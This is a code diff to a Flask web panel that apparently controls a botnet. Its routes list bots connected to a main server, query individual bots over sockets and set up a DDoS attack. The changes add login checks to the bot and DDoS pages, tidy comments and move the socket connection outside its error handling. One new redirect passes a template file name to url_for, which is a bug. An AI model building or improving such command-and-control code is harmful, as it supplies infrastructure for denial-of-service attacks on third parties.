@@ -44,7 +44,7 @@ def access():
     if request.method == 'GET':
         return render_template('access.html')
 
-#This is the main activity page, get all bots connected to the main server
+#This is the main activity page, it gets all bots connected to the main server
 @app.route('/main_activity', methods=['GET','POST'])
 def main_activity():
     if request.method == 'POST':
@@ -60,12 +60,12 @@ def main_activity():
         if not session.get('logged_in'):
             return redirect(url_for('home'))
         else:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            ip = session.get('ip')
+            port = session.get('port')
+            sock.connect((ip, port))
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                ip = session.get('ip')
-                port = session.get('port')
-                sock.connect((ip, port))
                 sock.send("*".encode('utf-8'))
                 data_b = sock.recv(4096)
                 data = data_b.decode('utf-8')
@@ -76,7 +76,7 @@ def main_activity():
             except socket.timeout as err:
                 return render_template('main_activity.html')
         
-#User activity, get information from the bot you are connected#
+#User activity, get information from the bot you are connected
 @app.route('/peer_activity/<ip>', methods=['GET','POST'])
 def peer_activity(ip):
     if request.method == 'POST':
@@ -109,7 +109,10 @@ def peer_activity(ip):
             return redirect(url_for('main_activity'))
 
     elif request.method == 'GET':
-        return render_template('peer_activity.html', ip = ip)
+        if session.get('logged_in') == True:
+            return render_template('peer_activity.html', ip = ip)
+        else:
+            return redirect(url_for('access'))
 
 #ddos_setup, setup for a ddos attack
 @app.route('/ddos_setup', methods=['GET','POST'])
@@ -135,7 +138,10 @@ def ddos_setup():
     elif request.method == 'GET':
         cnt_peers = session.get('cnt_peers')
         print(cnt_peers)
-        return render_template('ddos_setup.html', n_peers = cnt_peers)
+        if session.get('logged_in') == True:
+            return render_template('ddos_setup.html', n_peers = cnt_peers)
+        else: 
+            return redirect(url_for('main_activity.html'))
 
 if __name__ == "__main__":
     app.secret_key = os.urandom(12)
